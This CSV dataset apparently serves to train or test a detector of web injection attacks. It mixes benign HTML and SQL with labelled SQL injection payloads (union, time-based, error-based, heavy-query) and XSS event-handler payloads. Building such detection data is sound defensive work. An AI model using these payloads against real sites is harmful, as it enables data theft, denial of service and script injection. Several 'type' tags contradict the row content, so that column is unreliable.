Text,Label,type
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",2,xss
"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",1,xss
"<h2><span class=""mw-headline"" id=""Definitions"">Definitions ",0,xss
1'  )   as scnn where 9274  =  9274,1,sql
"1 union all select null,null,null,null,null#",1,sql
"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1,xss
"1 where 8948  =  8948 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,xss
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"-1000"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""isbq""  =  ""isbq",1,sql
 </li>,0,xss
zobelda,0,sql
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1,sql
"1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT * FROM instead WHERE solar LIKE '%create%',0,sql
"c/ juan rabadan 27, 6?a",0,sql
<svg><rb onload=alert(1)></rb>,2,xss
"<li><a href=""/wiki/Eliminative_materialism"" title=""Eliminative materialism"">Eliminative materialism </a> </li>",0,xss
3ist423o,0,xss
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,1,xss
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,2,xss
-9405' union all select 2539--,1,xss
anda matamalas,0,sql
guango,0,sql
<meta onpointerleave=alert(1)>XSS</meta>,2,xss
"<li><a href=""/wiki/Pain_(philosophy)"" title=""Pain (philosophy)"">Pain </a> </li>",0,xss
"calle ribadeo 78,",0,sql
DELETE FROM sick,0,sql
"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"<a href=""/wiki/Backpropagation"" title=""Backpropagation"">Backpropagation </a>:",0,xss
"  SELECT prize,disease FROM explanation WHERE character = 'lead' UNION SELECT telephone, perhaps FROM raw",0,sql
"INSERT INTO Customers  ( CustomerName, City, Country )  VALUES  ( 'Cardinal', 'Stavanger', 'Norway' ) ; ",0,sql
SELECT * FROM personal 3,0,sql
"		<div id=""catlinks"" class=""catlinks"" data-mw=""interface"">",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_bottom_content' LIMIT 1,0,sql
SELECT TOP 3 * FROM perfectly,0,sql
"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1,sql
6ait1na89,0,sql
-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
SELECT * FROM couple WHERE paid = 'youth'  AND  ( level = 'melted' OR long = 'luck' ) ,0,sql
"	 <div style=""padding:0em 0.25em""> </div><table class=""nowraplinks navbox-subgroup"" style=""border-spacing:0""><tbody><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Ancient </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a> </li> </ul>",0,xss
"<samp oncut=""alert(1)"" contenteditable>test</samp>",2,xss
"<li id=""cite_note-375""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-375"">^ </a> </b> ",0,xss
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
SELECT * FROM angle WHERE NOT how = 'off'  AND NOT uncle = 'call',0,sql
"SELECT * FROM of WHERE family BETWEEN ""boat"" AND    ""boat""",0,sql
SELECT * FROM attention WHERE effort = 'does'  OR everything = 'allow',0,xss
SELECT test ( s )  FROM means LEFT JOIN,0,sql
SELECT MIN ( it )  AS pitch FROM dinner,0,sql
"<dt oncontextmenu=""alert(1)"">test</dt>",2,xss
"select count  (  *  )   from generate_series  (  1,5000000  )  ",1,sql
hania,0,sql
"STYLE=""width: expression(alert(''))",2,xss
"<li><a href=""/wiki/Biomedical_cybernetics"" title=""Biomedical cybernetics"">Biomedical cybernetics </a> </li>",0,xss
6.05128E+15,0,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_intelligence_in_fiction"" title=""Artificial intelligence in fiction"">Artificial intelligence in fiction </a> </div>",0,xss
""" or true--",1,sql
SELECT * FROM cause FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1,sql
SELECT * FROM farm WHERE herself  BETWEEN 10 AND 20,0,xss
limit,1,sql
0n9ped7,0,sql
SELECT * FROM verb  WHERE forgot NOT LIKE '[arrow]%',0,sql
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""svse""  =  ""svse",1,sql
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,2,xss
	 </span> </li>,0,xss
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",2,xss
"<ul><li><a href=""/wiki/Category:Philosophy_of_mind"" title=""Category:Philosophy of mind"">Category </a> </li>",0,xss
<ul>,0,xss
79,0,sql
SELECT TOP 50 PERCENT * FROM travel SELECT * FROM usual FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stop,0,sql
SELECT * FROM  ( SELECT hollow FROM track ) ,0,sql
"<meta ondblclick=""alert(1)"">test</meta>",2,xss
SELECT * FROM flag WHERE worse = 'make' FETCH FIRST 3 ROWS ONLY,0,sql
"<li id=""cite_note-307""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-307"">^ </a> </b> ",0,xss
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></shadow>",2,xss
<marquee id=x tabindex=1 onactivate=alert(1)></marquee>,2,xss
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1,sql
SELECT COUNT ( value )  FROM tea,0,sql
SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0,sql
<style>//*{x:expression(alert(//))}//<style></style> ,2,xss
"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",1,sql
<s onpointermove=alert(1)>XSS</s>,2,xss
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",2,xss
SELECT * FROM day WHERE NOT powerful = 'married'  AND NOT stepped = 'plan',0,sql
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,1,xss
"<cite onmousemove=""alert(1)"">test</cite>",2,xss
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",2,xss
"<map oncopy=""alert(1)"" contenteditable>test</map>",2,xss
SELECT TOP 50 PERCENT * FROM realize,0,sql
DELETE FROM if,0,sql
"   SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL",0,sql
"1""  )   as esks where 1138  =  1138",1,xss
"c/ pablo iglesias, 116",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",0,xss
SELECT * FROM tone WHERE mathematics BETWEEN '1996-07-01' AND '1996-07-31',0,sql
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
1;SELECT *,1,xss
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1,sql
 </li>,0,xss
SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0,xss
"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,sql
"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",1,sql
1'+  (  select ankx where 6789  =  6789,1,sql
" SELECT column_name ( s )  FROM swung,uncle",0,sql
SELECT care ( s FROM charge RIGHT JOIN,0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",1,sql
SELECT * FROM although 3 SELECT * FROM frozen,0,xss
<plaintext onpointerup=alert(1)>XSS</plaintext>,2,xss
ataz crehuet,0,sql
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",1,sql
"   SELECT suppose, direction, nor FROM game WHERE president  IS NULL",0,sql
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",2,xss
SELECT AVG ( kept ) FROM pupil,0,sql
"<ul><li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0,xss
entrepalmadura,0,sql
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'txwf'  =  'txwf",1,sql
castellol,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">See also: <a href=""/wiki/Lethal_autonomous_weapon"" title=""Lethal autonomous weapon"">Lethal autonomous weapon </a> </div>",0,xss
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0,sql
"   SELECT COUNT ( fish ) , death FROM natural BY grown",0,sql
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
SELECT * FROM bar WHERE describe = 'second',0,sql
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,xss
" SELECT * FROM cup ORDER BY tobacco, several",0,sql
nydia,0,sql
-2214'  )   union all select 8228#,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>",2,xss
artica,0,sql
SELECT MIN ( list )  AS enjoy FROM happened,0,sql
<figcaption onpointerup=alert(1)>XSS</figcaption>,2,xss
"<li><a href=""/wiki/Fitness_approximation"" title=""Fitness approximation"">Fitness approximation </a> </li>",0,xss
"<map onmousedown=""alert(1)"">test</map>",2,xss
-4339  )   where 7178  =  7178 or 4008  =  7232,1,xss
"<li><a href=""/wiki/Fitness_function"" title=""Fitness function"">Fitness function </a> </li>",0,xss
<image src=validimage.png onloadend=alert(1)>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",2,xss
"<li class=""toclevel-3 tocsection-66""><a href=""#Technological_singularity""><span class=""tocnumber"">8.5.1 ",0,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",1,xss
"-6546""  )   order by 1#",1,sql
1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11524 )  ORDER BY meta_id ASC",0,sql
"  SELECT rocky,poetry,simple FROM negative LEFT JOIN Orders ON throat.frozenID =  reason.sleep ORDER BY inch.finger",0,sql
"<li>Joe (""<a href=""/wiki/A_Logic_Named_Joe"" title=""A Logic Named Joe"">A Logic Named Joe </a>"", 1946) </li>",0,xss
SELECT * FROM island WHERE get BETWEEN '1996-07-01' AND '1996-07-31',0,xss
SELECT unit FROM meet UNION SELECT notice FROM including ORDER BY specific,0,sql
"1%'  )   union all select null,null#",1,sql
SELECT COUNT ( DISTINCT grown )  FROM until,0,sql
"1%"" and 4595  =  4595#",1,xss
gallinero de cameros,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Cyberneticist"" title=""Cyberneticist"">Cyberneticians </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1,sql
hi' or 'x'  =  'x';,1,xss
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'jjmt'  =  'jjmt",1,sql
i77ovar,0,sql
5.74629E+15,0,sql
monopolizador,0,sql
<aside onpointerdown=alert(1)>XSS</aside>,2,xss
"            <div id=""p-views"" role=""navigation"" class=""vectorTabs "" aria-labelledby=""p-views-label"">",0,xss
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",2,xss
"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",2,xss
prado de la guzpea,0,sql
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1,sql
"1' where 1085  =  1085 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
21392437e,0,sql
<samp onpointerenter=alert(1)>XSS</samp>,2,xss
"SELECT * FROM right WHERE meant BETWEEN ""cotton"" AND    ""sort""",0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
7.13887E+14,0,sql
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dir>",2,xss
"<video oncopy=""alert(1)"" contenteditable>test</video>",2,xss
<p onpointerleave=alert(1)>XSS</p>,2,xss
SELECT AVG ( know ) FROM toward,0,xss
	 </span>,0,xss
"1%""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1,sql
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",1,sql
"=""javascript:alert('')",2,xss
<header onpointerleave=alert(1)>XSS</header>,2,xss
albets vilar,0,sql
 ,0,xss
"<img usemap=#x><map name=""x""><area href onfocusin=alert(1) id=x>",2,xss
<link onpointerenter=alert(1)>XSS</link>,2,xss
	 </span> ,0,xss
AI in England:,0,xss
8615,0,sql
retallac,0,sql
14100,0,xss
"<thead onmousemove=""alert(1)"">test</thead>",2,xss
SELECT * FROM position FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,0,sql
"<li id=""cite_note-Nature2017-258""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Nature2017_258-0"">^ </a> </b> ",0,xss
 </li>,0,xss
3.5822E+15,0,sql
<svg><footer onload=alert(1)></footer>,2,xss
chaddie,0,sql
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,1,sql
SELECT * FROM box WHERE start = 'clock',0,xss
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,2,xss
cmitre,0,sql
"  SELECT sand,sitting,acres FROM troops LEFT JOIN Orders ON pound.shoeID =  half.future ORDER BY was.into",0,sql
"<li><cite id=""CITEREFHutter2012"" class=""citation book"">Hutter, M. (2012). ""One Decade of Universal Artificial Intelligence"". <i>Theoretical Foundations of Artificial General Intelligence </i>. Atlantis Thinking Machines. <b>4 </b>. pp.&#160;67–88. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.228.8725"">10.1.1.228.8725 </a> ",0,xss
"<br oncopy=""alert(1)"" contenteditable>test</br>",2,xss
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",1,sql
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,sql
SELECT function ( s )  FROM whispered FULL OUTER JOIN,0,sql
els,0,sql
<content onpointerout=alert(1)>XSS</content>,2,xss
SELECT * FROM operation  WHERE lesson NOT LIKE '[rule]%',0,sql
"  SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )  ",0,sql
"1,  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",1,xss
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,2,xss
